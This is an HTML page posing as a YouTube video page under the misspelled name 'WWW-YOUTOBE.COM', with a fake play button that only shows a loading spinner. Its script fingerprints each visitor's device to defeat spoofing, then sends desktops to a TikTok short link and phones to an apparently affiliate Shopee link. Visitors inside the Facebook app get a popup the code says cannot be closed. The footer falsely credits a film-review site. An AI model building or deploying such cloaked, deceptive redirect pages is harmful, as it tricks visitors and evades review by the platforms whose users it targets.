<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>WWW-YOUTOBE.COM</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background: #FFF8E7;
    font-family: 'Segoe UI', Arial, sans-serif;
    min-height:100vh;
    display:flex;
    flex-direction:column;
}

.header{
    width:100%;
    background:#000;
    padding:20px 0;
    text-align:center;
    border-bottom: 3px solid #FFD966;
}

.header h1{
    color:#FFD966;
    font-size:clamp(32px,8vw,90px);
    font-weight:800;
    letter-spacing:3px;
    text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
}

.main{
    flex:1;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:7vw 4vw;
}

.video-box{
    width:min(90vw,760px);
    aspect-ratio:16/9;
    background:#000;
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
    border-radius: 24px;
    box-shadow: 0 20px 35px rgba(0,0,0,0.25);
    border: 2px solid #FFD966;
    overflow: hidden;
}

.play-btn {
    width: 90px;
    height: 90px;
    background: #FFD966;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
    position: relative;
}

.play-btn::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 100%;
    height: 100%;
    border-radius: 50%;
    background: rgba(255, 217, 102, 0.4);
    transform: translate(-50%, -50%) scale(0.8);
    opacity: 0;
    transition: all 0.4s ease;
    z-index: -1;
}

.play-btn:hover::before {
    opacity: 1;
    transform: translate(-50%, -50%) scale(1.3);
}

.play-btn:hover {
    transform: scale(1.08);
    background: #FFC107;
    box-shadow: 0 12px 28px rgba(0,0,0,0.4);
}

.play-icon {
    width: 0;
    height: 0;
    border-top: 20px solid transparent;
    border-bottom: 20px solid transparent;
    border-left: 32px solid #000;
    margin-left: 8px;
    filter: drop-shadow(0 2px 2px rgba(0,0,0,0.2));
}

@media (max-width: 640px) {
    .play-btn {
        width: 70px;
        height: 70px;
    }
    .play-icon {
        border-top: 14px solid transparent;
        border-bottom: 14px solid transparent;
        border-left: 24px solid #000;
        margin-left: 5px;
    }
}

@media (max-width: 480px) {
    .play-btn {
        width: 60px;
        height: 60px;
    }
    .play-icon {
        border-top: 12px solid transparent;
        border-bottom: 12px solid transparent;
        border-left: 20px solid #000;
        margin-left: 4px;
    }
}

.loading-video{
    display: none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 20px;
    color: #FFD966;
    font-size: clamp(16px, 4vw, 24px);
    font-weight: 600;
    text-align: center;
    width: 100%;
    height: 100%;
    background: #000;
    border-radius: 20px;
}

.spinner{
    width: 50px;
    height: 50px;
    border: 5px solid rgba(255,217,102,0.2);
    border-top: 5px solid #FFD966;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin{
    0%{ transform: rotate(0deg); }
    100%{ transform: rotate(360deg); }
}

.footer{
    text-align:center;
    padding: 25px 20px;
    background: #000;
    color: #FFD966;
    border-top: 2px solid #FFD966;
    margin-top: auto;
}

.footer p{
    font-size:clamp(13px, 3vw, 16px);
    font-weight: 500;
    line-height: 1.5;
    margin-bottom: 6px;
}

.footer p:first-child{
    font-weight: 700;
    margin-bottom: 8px;
    letter-spacing: 1px;
}

.fb-popup-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.92);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10000;
    padding: 20px;
    backdrop-filter: blur(6px);
}

.fb-popup-content {
    width: min(90vw, 550px);
    background: #000;
    border-radius: 28px;
    overflow: hidden;
    border: 2px solid #FFD966;
    box-shadow: 0 25px 45px rgba(0,0,0,0.5);
    text-align: center;
    padding: 24px 20px 24px 20px;
}

.fb-popup-content p {
    color: #FFD966;
    font-size: clamp(16px, 4vw, 20px);
    font-weight: 600;
    margin-bottom: 20px;
    line-height: 1.4;
    padding: 0 10px;
}

.fb-popup-content img {
    width: 100%;
    height: auto;
    display: block;
    border-radius: 16px;
    border: 1px solid #FFD966;
}

.hidden {
    display: none;
}
</style>

<script>
    // ======================= PHÁT HIỆN THIẾT BỊ CỰC KỲ CHẶT CHẼ =======================
    // Mục tiêu: 
    // - BẤT CỨ THIẾT BỊ NÀO CÓ DẤU HIỆU CỦA MÁY TÍNH (desktop/laptop) 
    //   (kể cả đang fake user-agent, fake touch, fake màn hình nhỏ) 
    //   => CHUYỂN HƯỚNG SANG TIKTOK
    // - Điện thoại thật (không phải Facebook App) => chuyển sang Shopee
    // - Điện thoại + Facebook App => hiển thị popup hướng dẫn (không chuyển hướng)
    
    (function() {
        // ------------------ Các hàm kiểm tra dấu hiệu máy tính ------------------
        // 1. Kiểm tra kích thước màn hình thực tế (không thể fake hoàn toàn qua viewport)
        function hasLargeScreen() {
            // Sử dụng cả innerWidth và screen.width để chống fake viewport
            return window.innerWidth > 800 || window.screen.width > 800;
        }
        
        // 2. Kiểm tra con trỏ chuột tinh vi (pointer: fine) – đặc trưng của chuột máy tính
        function hasFinePointer() {
            return window.matchMedia && window.matchMedia('(pointer: fine)').matches;
        }
        
        // 3. Kiểm tra hệ điều hành máy tính (Windows, macOS, Linux, BSD, Solaris)
        function isDesktopOS() {
            const platform = navigator.platform.toLowerCase();
            const ua = navigator.userAgent.toLowerCase();
            // Các từ khóa của hệ điều hành máy tính
            const desktopKeywords = ['win', 'mac', 'linux', 'x11', 'bsd', 'sunos', 'solaris'];
            for (let kw of desktopKeywords) {
                if (platform.includes(kw) || ua.includes(kw)) return true;
            }
            // Kiểm tra nếu không có từ khóa mobile như 'android', 'iphone'
            const mobileKeywords = ['android', 'iphone', 'ipad', 'ipod', 'blackberry', 'iemobile', 'opera mini', 'mobile'];
            let hasMobileKeyword = false;
            for (let kw of mobileKeywords) {
                if (ua.includes(kw)) { hasMobileKeyword = true; break; }
            }
            // Nếu không có từ khóa mobile và platform là desktop => desktop
            if (!hasMobileKeyword && (platform.includes('win') || platform.includes('mac') || platform.includes('linux'))) {
                return true;
            }
            return false;
        }
        
        // 4. Kiểm tra khả năng cảm ứng – máy tính thường không có hoặc rất ít điểm chạm
        function hasNoTouch() {
            return !('ontouchstart' in window) && (navigator.maxTouchPoints === 0);
        }
        
        // 5. Tổng hợp: thiết bị này có phải là máy tính (desktop/laptop) hay không?
        function isTrulyDesktop() {
            // Chỉ cần 1 trong các dấu hiệu dưới đây là kết luận DESKTOP
            // (kể cả đang fake user-agent, fake touch, fake viewport)
            if (hasLargeScreen()) return true;
            if (hasFinePointer()) return true;
            if (isDesktopOS()) return true;
            if (hasNoTouch()) return true;
            return false;
        }
        
        // ------------------ Kiểm tra Facebook App ------------------
        function isFacebookApp() {
            const ua = navigator.userAgent;
            return ua.includes('FBAN') || ua.includes('FBAV');
        }
        
        // ------------------ Kiểm tra điện thoại thật (không phải desktop) ------------------
        function isGenuineMobile() {
            // Nếu là desktop thì không phải mobile
            if (isTrulyDesktop()) return false;
            // Kiểm tra thêm: màn hình nhỏ + có cảm ứng
            const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
            const smallScreen = window.innerWidth <= 800;
            // Nếu có cảm ứng và màn hình nhỏ => mobile
            if (smallScreen && hasTouch) return true;
            // Dự phòng: user agent có từ khóa mobile
            const ua = navigator.userAgent.toLowerCase();
            return /android|iphone|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua);
        }
        
        // ======================= XỬ LÝ CHUYỂN HƯỚNG =======================
        // 1. Nếu là máy tính (kể cả fake UA) => TikTok
        if (isTrulyDesktop()) {
            window.location.replace('https://vt.tiktok.com/ZS929jkhqUdXh-kfltF/');
            return;
        }
        
        // 2. Nếu là điện thoại thật (không Facebook App) => Shopee
        if (isGenuineMobile() && !isFacebookApp()) {
            window.location.replace('https://s.shopee.vn/60Oxi1F2o4');
            return;
        }
        
        // 3. Còn lại: điện thoại + Facebook App => giữ nguyên, hiển thị popup (xử lý bên dưới)
    })();
</script>
</head>
<body>

<div class="header">
    <h1>WWW-YOUTOBE.COM</h1>
</div>

<div class="main">
    <div class="video-box">
        <div class="play-btn" id="playButton">
            <div class="play-icon"></div>
        </div>
        <div class="loading-video" id="loadingVideo">
            <div class="spinner"></div>
            <span>Đang tải video...</span>
        </div>
    </div>
</div>

<div class="footer">
    <p>© 2026 www-youtobe.com. All Rights Reserved.</p>
    <p>PhimReview.vn - Đánh giá phim & giới thiệu phim. Liên hệ bản quyền: contact@phimreview.vn</p>
</div>

<div class="fb-popup-overlay hidden" id="fbPopup">
    <div class="fb-popup-content">
        <p>Bạn đang mở web site bằng app facebook, hãy thao tác như hình dưới để tiếp tục</p>
        <img src="https://d2eioyamun8mp1.cloudfront.net/images/1780564000303_Fot9GpwfM3.jpg" alt="Hướng dẫn">
    </div>
</div>

<script>
// Chỉ hiển thị popup hướng dẫn nếu đang trong Facebook App trên mobile
// Popup KHÔNG có nút đóng, không thể tắt

(function() {
    function isFacebookApp() {
        return navigator.userAgent.includes('FBAN') || navigator.userAgent.includes('FBAV');
    }
    
    const popup = document.getElementById('fbPopup');
    if (isFacebookApp() && popup) {
        // Hiển thị popup sau 2 giây
        setTimeout(function() {
            popup.classList.remove('hidden');
        }, 2000);
    } else if (popup) {
        popup.classList.add('hidden');
    }
    
    // Nút Play: chỉ hoạt động khi ở Facebook App (không bị chuyển hướng)
    const playBtn = document.getElementById('playButton');
    const loadingDiv = document.getElementById('loadingVideo');
    if (playBtn && loadingDiv) {
        playBtn.addEventListener('click', function() {
            if (playBtn.style.display !== 'none' && loadingDiv.style.display !== 'flex') {
                playBtn.style.display = 'none';
                loadingDiv.style.display = 'flex';
            }
        });
    }
})();
</script>

</body>
</html>
